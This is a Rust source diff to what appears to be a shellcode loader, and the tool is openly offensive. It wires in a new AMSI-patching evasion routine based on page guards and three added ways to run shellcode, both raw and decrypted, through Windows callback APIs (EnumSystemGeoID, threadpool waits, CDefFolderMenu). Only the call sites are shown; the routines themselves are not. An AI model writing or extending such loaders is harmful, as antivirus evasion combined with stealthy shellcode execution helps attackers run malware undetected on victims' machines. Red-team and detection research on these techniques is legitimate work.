@@ -46,6 +46,11 @@ fn run_evasion_techniques() {
         let _ = evasion::amsi::patch_amsi_hwbp();
     }
 
+    #[cfg(feature = "EvasionAMSIPageGuard")]
+    {
+        let _ = evasion::amsi::patch_amsi_page_guard();
+    }
+
     #[cfg(feature = "EvasionETWSimple")]
     {
         let _ = evasion::etw::patch_etw();
@@ -229,6 +234,15 @@ fn main() {
 
         #[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
         execution::shellcode_execute_signalobjectandwaitapc(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+        execution::shellcode_execute_enumsystemgeoid(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+        execution::shellcode_execute_threadpoolwait(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+        execution::shellcode_execute_cdeffoldermenu(shellcode.clone());
     }
 
     // =======================================================================
@@ -357,6 +371,15 @@ fn main() {
 
             #[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
             execution::shellcode_execute_signalobjectandwaitapc(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
+            execution::shellcode_execute_enumsystemgeoid(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+            execution::shellcode_execute_threadpoolwait(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteCDefFolderMenu")]
+            execution::shellcode_execute_cdeffoldermenu(decrypted_shellcode.clone());
         }
     }
 }
